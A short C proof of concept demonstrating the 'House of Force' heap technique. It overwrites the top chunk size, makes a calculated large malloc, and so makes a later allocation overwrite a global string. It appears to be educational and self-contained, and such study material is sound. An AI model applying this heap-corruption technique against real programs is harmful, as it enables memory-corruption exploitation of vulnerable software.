#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

char target[] = "Target";

int main(int argc, char* argv[]){
    char* buf1, *buf2, *buf3;
    int64_t* top_chunk_size;
    int32_t target_addr = (int32_t)(&target);

    printf("==Before House of Force Attack==\n");
    printf("Target ===> %s\n\n", target);

    printf("[+] Target Addr: %p\n", &target);
    buf1 = malloc(0x80); // buf[0] ~ buf[15]
    top_chunk_size = (int64_t)buf1 + 0x88;
    printf("Top Chunk Addr(buf[0x88]): %p\n", top_chunk_size); // buf[17] 
    printf("Top Chunk Size(buf[0x88]): 0x%lx\n", *top_chunk_size); // buf[17] 
    
    *top_chunk_size = 0xffffffffffffffff;

    int64_t calc = (int64_t)target_addr - 0x10 - (int64_t)(buf1 + 0x80) - 0x10;
    printf("Calc : %lx\n\n", calc);

    printf("malloc(0x%lx)\n", calc);
    buf2 = malloc(calc);
    printf("[+] buf2 addr: %p\n", buf2);

    buf3 = malloc(0x80);
    printf("[+] buf3 addr: %p\n", buf3);
    strcpy(buf3, "AAAAAAAAexploit");
    printf("%s\n", target);


}
